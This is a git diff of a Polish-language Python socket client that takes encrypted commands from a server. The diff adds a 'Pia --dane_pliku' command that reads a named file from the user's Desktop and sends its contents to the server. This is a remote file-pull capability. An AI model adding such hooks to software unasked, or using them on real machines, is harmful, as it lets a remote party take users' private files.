@@ -42,6 +42,24 @@ print('Dziennik działań:')
 toaster = ToastNotifier()
 
 
+def odczytaj_dane_pliku(server_socket, nazwa_pliku):
+    try:
+        # Sprawdź czy plik istnieje na pulpicie
+        sciezka_pliku = os.path.join(os.path.join(
+            os.environ['USERPROFILE']), 'Desktop', nazwa_pliku)
+        if os.path.exists(sciezka_pliku):
+            # Otwórz plik i odczytaj jego zawartość
+            with open(sciezka_pliku, 'r') as file:
+                zawartosc = file.read()
+            # Wyślij zawartość pliku na serwer
+            server_socket.sendall(szyfrowanie(zawartosc).encode())
+            print(f'Zawartość pliku {nazwa_pliku} została wysłana na serwer.')
+        else:
+            print(f'Plik {nazwa_pliku} nie istnieje na pulpicie.')
+    except Exception as e:
+        print(f'Wystąpił błąd podczas odczytu pliku: {e}')
+
+
 def Pia_inna(server_socket):
     try:  # Tego pliku nie ma w repozytorium
         subprocess.run(['python', 'Inne_plecenia_s.py'])
@@ -227,6 +245,17 @@ def receive_messages(server_socket):
                 sys.exit()  # Wyjdź z programu
             elif odszyfrowywanie(data.decode()) == "Pia --clear":
                 os.system('cls')
+            elif decrypted_data.startswith("Pia --dane_pliku"):
+                # Odczytaj nazwę pliku, którą serwer przekazuje w komunikacie
+                command = decrypted_data.strip()
+                command_parts = command.split('("')
+                if len(command_parts) == 2:
+                    nazwa_pliku = command_parts[1].rstrip('")')
+                    # Wywołaj funkcję odczytującą plik i wysyłającą na serwer
+                    odczytaj_dane_pliku(server_socket, nazwa_pliku)
+                else:
+                    print("Błędny format polecenia przesłania pliku")
+
             else:
                 print(Fore.LIGHTBLUE_EX +
                       'Otrzymana wiadomość od serwera:', odszyfrowywanie(data.decode()))
